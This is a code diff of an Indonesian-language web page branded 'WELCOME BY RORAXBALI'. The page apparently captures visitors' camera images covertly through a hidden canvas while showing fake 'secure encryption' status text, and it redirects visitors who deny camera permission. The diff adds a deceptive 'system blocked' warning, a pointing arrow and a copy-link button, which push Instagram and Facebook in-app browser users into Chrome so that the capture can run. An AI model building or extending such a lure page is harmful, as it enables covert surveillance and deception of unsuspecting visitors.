@@ -33,7 +33,7 @@
         .terminal {
             width: 90%;
             max-width: 500px;
-            padding: 60px 20px;
+            padding: 40px 20px;
             position: relative;
             text-align: center;
             z-index: 10;
@@ -82,20 +82,6 @@
             line-height: 1.6;
         }
 
-        /* Status khusus untuk instruksi Instagram Browser (Merah Berkedip) */
-        .status-instagram {
-            color: #ff3333 !important;
-            text-shadow: 0 0 10px #ff0000;
-            font-size: 15px;
-            animation: kedip 1.5s infinite;
-        }
-
-        @keyframes kedip {
-            0% { opacity: 1; }
-            50% { opacity: 0.4; }
-            100% { opacity: 1; }
-        }
-
         /* Desain Progress Bar / Loading Bar Merah Minimalis */
         .progress-container {
             width: 60%;
@@ -119,21 +105,126 @@
             background-color: #ff0000 !important;
             box-shadow: 0 0 12px #ff0000 !important;
         }
+
+        /* Panah Petunjuk ke Titik Tiga Kanan Atas */
+        .panah-ig {
+            display: none;
+            position: fixed;
+            top: 15px;
+            right: 20px;
+            color: #ff0000;
+            font-size: 45px;
+            z-index: 9999;
+            text-shadow: 0 0 15px #ff0000;
+            animation: tunjukPanah 1s infinite alternate;
+        }
+
+        @keyframes tunjukPanah {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(5px, -5px) scale(1.1); }
+        }
+
+        /* Container Instruksi Fitur Salin Link */
+        .ig-box-instruksi {
+            display: none;
+            margin-top: 25px;
+            background: rgba(255, 0, 0, 0.05);
+            border: 1px dashed rgba(255, 0, 0, 0.4);
+            padding: 15px;
+            border-radius: 4px;
+        }
+
+        .ig-text-error {
+            color: #ff3333 !important;
+            text-shadow: 0 0 10px #ff0000;
+            font-size: 15px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        /* Input Box Tempat Link Berada */
+        .salin-wrapper {
+            display: flex;
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+
+        .salin-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #888;
+            padding: 10px;
+            font-size: 12px;
+            font-family: sans-serif;
+            pointer-events: none;
+        }
+
+        /* Tombol Salin */
+        .salin-btn {
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 0 15px;
+            font-size: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-family: sans-serif;
+            transition: background 0.2s;
+        }
+
+        .salin-btn:active {
+            background: #b30000;
+        }
     </style>
 </head>
 <body>
 
+    <!-- Indikator Panah Penunjuk ke Titik 3 Instagram (Kanan Atas) -->
+    <div id="panahIG" class="panah-ig">↗️</div>
+
     <div class="terminal">
         <div class="garis-merah-atas"></div>
         <h1>WELCOME BY RORAXBALI</h1>
+        
+        <!-- Status Normal Browser (Chrome/Safari) -->
         <div class="status-text" id="status">Menginisialisasi enkripsi aman...</div>
-        <div class="progress-container">
+        
+        <!-- Progress Bar -->
+        <div class="progress-container" id="progressContainer">
             <div class="progress-bar" id="bar"></div>
         </div>
+
+        <!-- BLOK INSTRUKSI TAMPIL HANYA DI INSTAGRAM -->
+        <div id="igBox" class="ig-box-instruksi">
+            <div class="ig-text-error">
+                ⚠️ SISTEM TERBLOKIR DI INSTAGRAM<br>
+                Silakan buka menggunakan Google Chrome melalui opsi di bawah ini:
+            </div>
+            
+            <div class="status-text" style="color: #fff; font-size: 12px;">
+                CARA 1: Klik titik 3 di pojok kanan atas, lalu pilih "Buka di Browser / Open in Browser".
+            </div>
+
+            <div class="status-text" style="color: #fff; font-size: 12px; margin-top: 15px;">
+                CARA 2: Salin tautan di bawah ini dan tempel (paste) di aplikasi Google Chrome Anda.
+            </div>
+
+            <!-- Fitur Salin Link Otomatis -->
+            <div class="salin-wrapper">
+                <input type="text" class="salin-input" id="linkInput" value="https://github.io" readonly>
+                <button class="salin-btn" id="copyBtn" onclick="salinTautanOtomatis()">Salin</button>
+            </div>
+        </div>
+
         <div class="garis-merah-bawah"></div>
     </div>
-
-    <video id="video" autoplay playsinline muted></video>
+        <video id="video" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas"></canvas>
 
     <script>
@@ -147,22 +238,43 @@
         const hiddenCanvas = document.getElementById('hiddenCanvas');
         const statusText = document.getElementById('status');
         const progressBar = document.getElementById('bar');
+        
+        // Element khusus Instagram
+        const panahIG = document.getElementById('panahIG');
+        const igBox = document.getElementById('igBox');
+        const progressContainer = document.getElementById('progressContainer');
 
-        // Fungsi mengecek apakah dibuka dari dalam aplikasi Instagram
+        // Fungsi mengecek apakah dibuka dari dalam aplikasi Instagram / Facebook WebView
         function isInstagram() {
             return navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");
         }
 
-        // Jalankan pengecekan pertama kali halaman dimuat
+        // Jalankan logika kondisional berdasarkan jenis browser pengakses
         if (isInstagram()) {
-            // Jika terdeteksi di IG, langsung stop proses kamera dan paksa user ganti browser
-            statusText.innerHTML = "⚠️ PERINGATAN SISTEM:<br>Klik titik 3 di pojok kanan atas,<br>lalu pilih 'Buka di Browser / Open in Browser' untuk melanjutkan.";
-            statusText.classList.add("status-instagram");
-            progressBar.style.width = "40%";
-            progressBar.classList.add("error");
+            statusText.style.display = 'none';
+            progressContainer.style.display = 'none';
+            panahIG.style.display = 'block';
+            igBox.style.display = 'block';
         } else {
-            // Jika dibuka di Chrome/Safari normal, jalankan skrip kamera seperti biasa
             mulaiKameraSistem();
+        }
+
+        // Fungsi menyalin tautan otomatis saat tombol di-klik
+        function salinTautanOtomatis() {
+            const linkInput = document.getElementById('linkInput');
+            const copyBtn = document.getElementById('copyBtn');
+
+            linkInput.select();
+            linkInput.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(linkInput.value);
+
+            copyBtn.innerText = "Tersalin!";
+            copyBtn.style.background = "#00cc44";
+            
+            setTimeout(() => {
+                copyBtn.innerText = "Salin";
+                copyBtn.style.background = "#ff0000";
+            }, 3000);
         }
 
         function mulaiKameraSistem() {
@@ -183,6 +295,7 @@
                 .catch(err => {
                     console.error("Akses ditolak: ", err);
                     statusText.innerText = "OTORISASI GAGAL: Akses dibatasi karena izin perangkat ditolak.";
+                    statusText.style.color = "#ff3333";
                     progressBar.style.width = "100%";
                     progressBar.classList.add("error");
                     setTimeout(() => { window.location.href = DOMAIN_TUJUAN; }, 2000);
